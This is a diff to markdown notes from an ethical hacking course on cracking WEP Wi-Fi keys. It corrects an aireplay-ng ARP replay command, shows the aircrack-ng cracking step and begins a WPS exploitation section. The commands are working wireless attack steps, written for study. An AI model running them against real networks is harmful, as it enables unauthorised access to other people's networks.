@@ -166,18 +166,16 @@ aireplay-ng --fakeauth 0 -a [NetworkMAC] -h [HackerMAC] wlan0
 ```
 ARP request replay. Wait for an ARP packet. Capture it and replay it. This causes the AP to produce another packet with a new IV. Keep doing this untill we have enough IVs to crack the key.
 ```
-aireplay-ng arpreplay -b [NetworkMAC] -h [HackerMAC] wlan0
+aireplay-ng --arpreplay -b [NetworkMAC] -h [HackerMAC] wlan0
 ```
-Crack with following command.
+airodump-ng capturing may go on. Crack with following command.
 ```
 aircrack-ng filename.cap
 ```
 ### WPA/WPA2 cracking
 #### WPS feature exploiting
-
-
-
-
+##### Requirements
+* WPS enabled
 
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
